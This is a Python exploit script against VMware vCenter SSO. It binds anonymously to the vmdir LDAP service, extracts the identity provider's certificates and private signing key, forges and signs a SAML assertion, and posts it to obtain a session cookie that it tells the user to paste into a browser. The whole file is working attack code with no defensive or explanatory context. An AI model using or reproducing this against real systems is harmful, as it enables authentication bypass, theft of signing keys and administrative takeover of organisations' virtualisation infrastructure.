#!/usr/bin/env python3

import base64
import sys
import zlib
from urllib.parse import parse_qs, quote, unquote, urlparse

import ldap
import lxml.etree as etree
import requests
import urllib3
from signxml import XMLSignatureProcessor, XMLSigner


def get_idp_key(vcenter):
    """Get SSO SAML IdP certificates and key from vmdir"""

    def writepem(filename, bytes):
        with open(filename, "w") as f:
            f.write("-----BEGIN CERTIFICATE-----\n")
            f.write(base64.encodebytes(bytes).decode("utf-8"))
            f.write("-----END CERTIFICATE-----\n")

    def writekey(filename, bytes):
        with open(filename, "w") as f:
            f.write("-----BEGIN PRIVATE KEY-----\n")
            f.write(base64.encodebytes(bytes).decode("utf-8"))
            f.write("-----END PRIVATE KEY-----\n")

    l = ldap.initialize(f"ldap://{vcenter}:389")
    l.simple_bind()
    dn = "cn=TenantCredential-1,cn=vsphere.local,cn=Tenants,cn=IdentityManager,cn=Services,dc=vsphere,dc=local"
    o = l.search_s(dn, ldap.SCOPE_BASE, "(objectClass=*)")
    writepem("idp1.pem", o[0][1]["userCertificate"][0])
    writepem("idp2.pem", o[0][1]["userCertificate"][1])
    writekey("idp.key", o[0][1]["vmwSTSPrivateKey"][0])


def saml_request(vcenter):
    """Get SAML AuthnRequest from vCenter web UI"""
    r = requests.get(f"https://{vcenter}/ui/login", allow_redirects=False, verify=False)
    if r.status_code != 302:
        raise Exception("expected 302 redirect")
    o = urlparse(r.headers["location"])
    sr = parse_qs(o.query)["SAMLRequest"][0]
    dec = base64.decodebytes(sr.encode("utf-8"))
    req = zlib.decompress(dec, -8)
    return etree.fromstring(req)


def fill_template(vcenter, req):
    """Fill in the SAML response template"""
    t = open("saml-response-template.xml", "r").read()
    t = t.replace("$VCENTER", vcenter)
    t = t.replace("$ID", req.get("ID"))
    t = t.replace("$ISSUEINSTANT", req.get("IssueInstant"))
    return etree.fromstring(t.encode("utf-8"))


def sign_assertion(root):
    """Sign the SAML assertion in the response using the IdP key"""
    cert1 = open("idp1.pem", "r").read()
    cert2 = open("idp2.pem", "r").read()
    key = open("idp.key", "r").read()
    assertion_id = root.find("{urn:oasis:names:tc:SAML:2.0:assertion}Assertion").get(
        "ID"
    )
    signer = XMLSigner(c14n_algorithm="http://www.w3.org/2001/10/xml-exc-c14n#")
    return signer.sign(root, reference_uri=assertion_id, key=key, cert=[cert1, cert2])


def login(vcenter, saml_resp):
    """Log in to the vCenter web UI using the signed response and return a session cookie"""
    resp = etree.tostring(s, xml_declaration=True, encoding="UTF-8", pretty_print=False)
    r = requests.post(
        f"https://{vcenter}/ui/saml/websso/sso",
        allow_redirects=False,
        verify=False,
        data={"SAMLResponse": base64.encodebytes(resp)},
    )
    if r.status_code != 302:
        raise Exception("expected 302 redirect")
    return r.headers["Set-Cookie"].split(";")[0]


vcenter = sys.argv[1]
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
req = saml_request(vcenter)
t = fill_template(vcenter, req)
s = sign_assertion(t)
c = login(vcenter, s)
print(f"Set this cookie in your browser:\n{c}\n\nAnd browse to https://{vcenter}/ui")